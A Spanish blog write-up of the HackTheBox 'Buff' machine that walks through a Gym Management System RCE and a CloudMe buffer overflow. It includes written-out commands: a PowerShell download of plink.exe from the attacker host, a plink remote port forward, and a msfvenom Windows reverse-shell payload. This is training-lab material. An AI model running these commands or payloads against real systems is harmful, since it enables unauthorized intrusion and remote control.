@@ -1,0 +1,1223 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - Buff</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Buff | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - Buff" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina Windows nivel fácil. Buff buff uff, explotaremos un gimnasio :o (casi) yyy aprovecharemos un Buffer Overflow para ser amos del sistema… ¿Sencillo, no? pues…" />
+<meta property="og:description" content="Máquina Windows nivel fácil. Buff buff uff, explotaremos un gimnasio :o (casi) yyy aprovecharemos un Buffer Overflow para ser amos del sistema… ¿Sencillo, no? pues…" />
+<link rel="canonical" href="http://localhost:4000/htb/buff" />
+<meta property="og:url" content="http://localhost:4000/htb/buff" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/buff/bannerbuff.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-11-21T00:00:00-08:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/buff/bannerbuff.png" />
+<meta property="twitter:title" content="HackTheBox - Buff" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2020-11-21T00:00:00-08:00","datePublished":"2020-11-21T00:00:00-08:00","description":"Máquina Windows nivel fácil. Buff buff uff, explotaremos un gimnasio :o (casi) yyy aprovecharemos un Buffer Overflow para ser amos del sistema… ¿Sencillo, no? pues…","headline":"HackTheBox - Buff","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/buff/bannerbuff.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/buff"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/buff"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - Buff</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2020-11-21">21 Nov 2020</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/buff/bannerbuff.png" alt="HackTheBox - Buff">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina Windows nivel fácil. Buff buff uff, explotaremos un gimnasio :o (casi) yyy aprovecharemos un Buffer Overflow para ser amos del sistema… ¿Sencillo, no? pues…</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/buff/buffHTB.png" alt="buffHTB" /></p>
+
+<h3 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h3>
+
+<p>Buenas buenas, e.e. Mediante la enumeración de servicios nos encontramos con el puerto <code>8080</code> abierto, dándole vueltas nos topamos con el software con que fue creada la página, <code>Gym Management System 1.0</code>, usando <strong>searchsploit</strong> y la web le encontramos un exploit, nos aprovecharemos de el para obtener acceso a la máquina.</p>
+
+<p>Estando dentro veremos que el usuario <code>shaun</code> en sus carpetas tiene un binario interesante (del servicio <strong>CloudMe</strong>), el cual nos permite hacer cositas con las nubes :P, enumerando su origen veremos que existe un <code>Buffer Overflow</code> que afecta la versión que tenemos y nos permite ejecutar código como usuario <strong>administrador</strong>. Con esto en mente nos pondremos a jugar para hacer un <code>Remote Port Forwarding</code> ya que la maquina nos presentara limitantes.</p>
+
+<p>Después del <em>RPF</em> usaremos nuestras propias herramientas para que el <strong>BOF</strong> nos genere una reverse Shell como el usuario administrador del sistema. Eeeeeeeeeeeeeesto en pocas palabras. Démosle candela (:</p>
+
+<blockquote>
+  <p>Escribo para tener mis “notas”, por si algun dia se me olvida todo, leer esto y reencontrarme :)</p>
+</blockquote>
+
+<p>Tendremos 3 fases. Enumeración, explotación y escalada de privilegios (:</p>
+
+<ol>
+  <li><a href="#enumeracion">Enumeración</a></li>
+  <li><a href="#explotacion">Explotación</a></li>
+  <li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li>
+</ol>
+
+<p>…</p>
+
+<h2 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h2>
+
+<p>Hacemos un escaneo de puertos con <code>nmap</code>, primero validamos que tal va de velocidad y según eso agregamos parámetros para hacerlo más rápido, eso si, validando falsos positivos (que se nos pierdan puertos).</p>
+
+<pre><code class="language-bash">$nmap -p- --open -Pn -v 10.10.10.198
+</code></pre>
+
+<p>Wow, va muy lento, agregándole <code>-T</code> no cambia mucho, así que usaremos <code>--min-rate</code>.</p>
+
+<pre><code class="language-bash">$nmap -p- --open --min-rate=2000 -Pn -v 10.10.10.198
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escanea todos los 65535</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que están abiertos</td>
+    </tr>
+    <tr>
+      <td>-T4</td>
+      <td style="text-align: left">Forma de escanear superrápido, (claramente hace mucho ruido, pero al ser controlado no nos preocupamos)</td>
+    </tr>
+    <tr>
+      <td>–min-rate</td>
+      <td style="text-align: left">Indica que no queremos hacer peticiones menores al num que pongamos (i.e: –min-rate=5000)</td>
+    </tr>
+    <tr>
+      <td>-Pn</td>
+      <td style="text-align: left">Evita que realice Host Discovery, tales como Ping (P) y DNS (n)</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo (con formato grepeable, para usar una <a href="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png">función</a> de <a href="https://s4vitar.github.io/">S4vitar</a> que me extrae los puertos en la clipboard)</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/buff/nmapinitscan.png" alt="nmapinitscan" /></p>
+
+<p>Perfe, obtenemos dos puertos.</p>
+
+<ul>
+  <li>8080: Servicio web.</li>
+  <li>7680: No se que sea este puerto, validemos</li>
+</ul>
+
+<p>Ahora que tenemos los puertos, haremos un escaneo para verificar que versión y scripts maneja cada uno.</p>
+
+<pre><code class="language-bash">$nmap -p8080,7680 -sC -sV 10.10.10.193 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
+    </tr>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/buff/nmapportscan.png" alt="nmapportscan" /></p>
+
+<p>Nada relevante :(</p>
+
+<h4 id="-servicio-web-puerto-8080">&gt; Servicio web puerto <strong>8080</strong></h4>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/buff/pagemain.png" alt="pagemain" /></p>
+
+<p>Enumerando la página vemos que software se usó para su creación.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/buff/pagecontact.png" alt="pagecontact" /></p>
+
+<p>…</p>
+
+<h2 id="explotacion">Explotación <a href="#explotacion">#</a></h2>
+
+<p>Buscando exploits sobre el, encontramos:</p>
+
+<pre><code class="language-bash">$searchsploit gym
+-------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                      |  Path
+-------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Gym Management System 1.0 - Unauthenticated Remote Code Execution                                                   | php/webapps/48506.py
+-------------------------------------------------------------------------------------------------------------------- ---------------------------------
+</code></pre>
+
+<ul>
+  <li>Este es el exploit: <a href="https://www.exploit-db.com/exploits/48506">Exploit Gym Management System</a>.</li>
+</ul>
+
+<p>Perfecto, validando el código y el PoC, hace un bypass en la subida de archivos de la página <code>/upload.php</code> para almacenar un archivo que nos permita ejecutar comandos desde el mismo exploit. Está perfectamente explicado en el script :P</p>
+
+<p>El mismo exploit nos “emula” una Shell, pero no estamos en una Shell (parece, pero es por que en el script se está ejecutando <code>echo %CD%</code>, lo cual en Windows nos dice en que carpeta estamos), simplemente tenemos ejecución de comandos, pero limitados, por lo que lo mejor es subir el binario <code>netcat</code> para posteriormente ponernos en escucha y simplemente enviar la petición con el exploit.</p>
+
+<pre><code class="language-bash">$python3 -m http.server
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/buff/exploitnc.png" alt="exploitnc" /></p>
+
+<p>Listo, estando dentro y haciendo una enumeración básica sobre el usuario <strong>shaun</strong>, nos encontramos con un binario en su carpeta de descargas.</p>
+
+<pre><code class="language-powershell">c:\Users\shaun\Downloads&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A22D-49F7
+
+ Directory of c:\Users\shaun\Downloads
+
+05/10/2020  00:12    &lt;DIR&gt;          .
+05/10/2020  00:12    &lt;DIR&gt;          ..
+16/06/2020  16:26        17,830,824 CloudMe_1112.exe
+               1 File(s)     17,830,824 bytes
+               2 Dir(s)   7,934,279,680 bytes free
+
+c:\Users\shaun\Downloads&gt;
+</code></pre>
+
+<p>…</p>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios <a href="#escalada-de-privilegios">#</a></h2>
+
+<p>Investigando en internet vemos que esa versión de <strong>CloudMe</strong> es vulnerable a <code>Buffer Overflow</code> (si lo relacionamos con el nombre de la máquina sabemos que este es el camino) permitiéndonos ejecutar comandos en el sistema. Ya existen varios PoC (pruebas de concepto) que lo explotan.</p>
+
+<p>En todos los exploits usan el puerto 8888, con ello entendemos que CloudMe se ejecuta en ese puerto. En nuestro escaneo no lo obtuvimos, veamos su estado. Si ejecutamos el binario y posteriormente validamos si el puerto está arriba vamos a verlo arriba:</p>
+
+<pre><code class="language-powershell">c:\Users\shaun\Downloads&gt;netstat -a | findstr 8888
+</code></pre>
+
+<p>Tenemos que está en escucha pero mediante el localhost. Pues sencillo, solo es ejecutar el script, cambiarle el payload de <code>msfvenom</code> para que haga una petición a nuestra máquina y listos…</p>
+
+<p><strong>Pues no</strong>, la maquina no tiene <strong>Python</strong> y no permite ejecutar scripts de <strong>PowerShell</strong> (hay un exploit también). Así que tenemos dos opciones, pasar algún script de <strong>Python</strong> a <strong>.exe</strong> y subirlo o hacer un <em>Remote Port Forwarding</em>. Me voy con la segunda opción. (La primera la intente pero me dio problemas).</p>
+
+<p>Básicamente un <strong>Remote Port Forwarding</strong> nos permite tomar un puerto de la máquina local para decirle que tome ese puerto y lo monte en uno de la máquina remota… Por lo que si tenemos el puerto 8888 localmente y le decimos que queremos montar ese puerto en nuestra máquina remota, tendremos el servicio CloudMe (8888) ejecutándose en nuestro puerto :). Y como en nuestra máquina si tenemos <code>python</code>, podremos explotarlo.</p>
+
+<p>Validemos que hay en nuestro puerto 8888:</p>
+
+<pre><code class="language-bash">┌─[root@rave]─[/buff]
+└──╼ #lsof -i:8888
+┌─[✗]─[root@rave]─[/buff]
+└──╼ #
+</code></pre>
+
+<p>Nada aún.</p>
+
+<p>El Remote Port Forwarding lo haremos con <code>plink.exe</code> (relativamente parecido a <strong>SSH</strong> pero para Windows), procedemos a subirlo y ejecutarlo.</p>
+
+<p>Pero antes, veamos alguna configuración necesaria en nuestra máquina atacante sobre SSH. En el archivo <code>/etc/ssh/sshd_config</code> debemos modificar que nos permita ingresar como root, por que si no, nos va a botar unos errores.</p>
+
+<pre><code class="language-bash">$cat /etc/ssh/sshd_config
+...
+...
+PermitRootLogin yes
+...
+...
+</code></pre>
+
+<p>Y ahora reiniciamos el servicio SSH.</p>
+
+<pre><code class="language-bash">$service ssh restart
+</code></pre>
+
+<p>Listo ahora si procedemos a subir el binario y ejecutarlo.</p>
+
+<pre><code class="language-powershell">c:\Users\shaun\Downloads&gt;cd c:\Xampp\tmp
+c:\Xampp\tmp&gt;powershell IWR -uri http://10.10.15.86:8000/plink.exe -OutFile c:\Xampp\tmp\plink.exe
+c:\Xampp\tmp&gt;plink.exe -l root -pw hola2 -R 8888:127.0.0.1:8888 10.10.15.86
+FATAL ERROR: Network error: Connection timed out
+</code></pre>
+
+<p>Acá tuve algunos problemas, ya que por alguna extraña razón (valide firewall, configuraciones, etc) no me permitía conectarme al puerto <strong>22</strong> (SSH), así que cambiando el puerto que estará en escucha si nos permite ejecutarlo.</p>
+
+<pre><code class="language-bash">$cat /etc/ssh/sshd_config
+...
+Port 177
+...
+</code></pre>
+
+<p>Y ejecutamos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/buff/plinkdone.png" alt="plinkdone" /></p>
+
+<p>Perfecto, ya tenemos el puerto 8888 del localhost de la máquina 10.10.10.198 (BUFF) en nuestro equipo, lo siguiente es tomar algún exploit, crear el payload y ejecutarlo sobre nuestro localhost :)</p>
+
+<p>Usaremos dos exploits, de uno obtendré como generar el payload y el otro será la estructura del script.</p>
+
+<ul>
+  <li><a href="https://www.exploit-db.com/exploits/48499">Payload</a>, aunque se puede usar este también para explotarlo, pero me pareció más legible el siguiente:</li>
+  <li><a href="https://www.exploit-db.com/exploits/48389">El que usaremos</a>.</li>
+</ul>
+
+<p>Le diremos que nos genere una reverse Shell hacia el puerto <strong>4433</strong>. Primero generemos el payload con <code>msfvenom</code> (que no es lo mismo que <code>msfconsole</code> (metasploit)).</p>
+
+<pre><code class="language-bash"># msfvenom -p windows/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; EXITFUNC=thread -b "\x00\x0d\x0a" -f python
+$msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.86 LPORT=4433 EXITFUNC=thread -b "\x00\x0d\x0a" -f python
+</code></pre>
+
+<p>El output lo ponemos en el exploit. Nos ponemos en escucha y listo, ejecutará todo sobre el <strong>localhost:8888</strong>.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/buff/pyexploitandflags.png" alt="pyexploitandflags" /></p>
+
+<p>…</p>
+
+<p>Y listones, primer <strong>BOF</strong> en HTB que “hago” (en este caso simplemente lo ejecuté), sencilla, bonita y nueva para mí.</p>
+
+<p>Gracias por leer y a romper todo como siempre :P</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Buff&url=http://localhost:4000/htb/buff" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#CloudMe">CloudMe</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#buffer-overflow">buffer-overflow</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#gym-management-system">gym-management-system</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/enterprise">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112banner.png" alt="HackTheBox - Enterprise"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/enterprise">HackTheBox - Enterprise</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel medio, vamos a movernos entre sentencias SQL para generar pinchazos e.e Pivotearemos entre contenedores y compartiremos experiencias con el host… Finalmente explotaremos un buffer overflow mediante un...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">10 May 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/article/picoctf19-overflow1">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/CTF/picoctf/2019/overflow1/overflow1.jpeg" alt="PicoCTF2019 - Overflow1"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/article/picoctf19-overflow1">PicoCTF2019 - Overflow1</a>
+                
+            </h2>
+            <h4 class="card-text">Exploraremos un Buffer Overflow pa toda la familia, tendremos que moveremos a una función que contiene la flag.
+
+</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">04 Mar 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
